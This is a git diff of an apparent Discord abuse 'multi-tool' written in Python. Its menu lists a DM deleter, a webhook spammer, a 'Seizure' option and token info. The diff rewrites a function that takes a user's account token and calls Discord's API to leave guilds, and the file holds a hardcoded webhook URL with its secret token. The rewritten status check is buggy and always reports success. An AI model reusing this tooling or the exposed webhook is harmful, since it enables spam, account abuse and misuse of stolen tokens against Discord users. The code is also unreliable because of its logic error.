@@ -14,7 +14,7 @@ from selenium import webdriver
 
 console = get_console()
 
-maj = 'V3.5.2'
+maj = 'V3.5.3'
 webhook = "https://discord.com/api/webhooks/1024752077622218823/2ggeu3AOw5W_mw2FUsNSP_v0SPrZeEM5F26wZyXK6E6DKKS5yZWAtlRn0011BC4phDph"
 #please don't spam or nuke this one it's really important for the tool
 
@@ -214,18 +214,21 @@ def Leaver():
     token = console.input(f"[green][[/green][purple]?[/purple][green]][/green][purple] Token[/purple] : ")
     validateToken(token)
     guilds = console.input("[green][[/green][purple]?[/purple][green]][/green] enter the [purple]guilds id[/purple] : ")
-    for guild in guilds:
-        response = requests.delete('https://discord.com/api/v8/users/@me/guilds/' + guild['id'], headers={'Authorization': token})
-        if response.status_code == 204 or response.status_code == 200:
-            print(f"{Fore.YELLOW}Left guild: {Fore.WHITE}"+guild['name']+Fore.RESET)
-        elif response.status_code == 400:
-            requests.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers=getheaders(token))
-            print(f'[green][[/green][purple]![/purple][green]][/green] Deleted guild: {Fore.WHITE}'+guild['name']+Fore.RESET)
-        else:
-            console.print(f"[green][[/green][purple]?[/purple][green]][/green] The following error has been [purple]encountered and is being ignored[/purple]: {response.status_code}")
-            pass
-    console.input(f'[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
-    main()
+    response = requests.delete(f'https://discord.com/api/v8/users/@me/guilds/{guilds}', headers={'Authorization': token})
+    fact = response.status_code
+    try:
+        if fact == 200 or 204 or 201 or 202:
+            console.print(f"[green][[/green][purple]?[/purple][green]][/green] Left guild: [blue]{guilds}[/blue]")
+            console.input(f'[green][[/green][purple]![/purple][green]][/green] Enter anything to continue. . . ')
+            main()
+        if fact == 404:
+            console.print("[red][[/red][purple]![/purple][red]][/red] An error [red]occured[/red]")
+            console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
+            main()
+    except:
+        console.print("[red][[/red][purple]![/purple][red]][/red] An error [red]occured[/red]")
+        console.input('[green][[/green][purple]?[/purple][green]][/green] Enter anything to continue. . . ')
+        main()
 
 def Webhook_Spammer():
     try:
@@ -314,7 +317,7 @@ def main():
                                     [green]███████[/green]║[green]██[/green]║        [green]██[/green]║   [green]███████[/green]║[green]███████[/green]╗    
                                     ╚══════╝╚═╝        ╚═╝   ╚══════╝╚══════╝    
                             ╔═══════════════════════════════════════════════════╗                                             
-                            ║  [green]{[/green][purple]1[/purple][green]}[/green] Dm deleter              [green]{[/green][purple]7[/purple][green]}[/green] Server leaver    ║
+                            ║  [green]{[/green][purple]1[/purple][green]}[/green] [red]Dm deleter[/red]              [green]{[/green][purple]7[/purple][green]}[/green] Server leaver    ║
                             ║  [green]{[/green][purple]2[/purple][green]}[/green] Webhook deleter         [green]{[/green][purple]8[/purple][green]}[/green] Seizure          ║
                             ║  [green]{[/green][purple]3[/purple][green]}[/green] Webhook spamer          [green]{[/green][purple]9[/purple][green]}[/green] Token info       ║
                             ║  [green]{[/green][purple]4[/purple][green]}[/green] Bio changer             [green]{[/green][purple]10[/purple][green]}[/green] Setting         ║
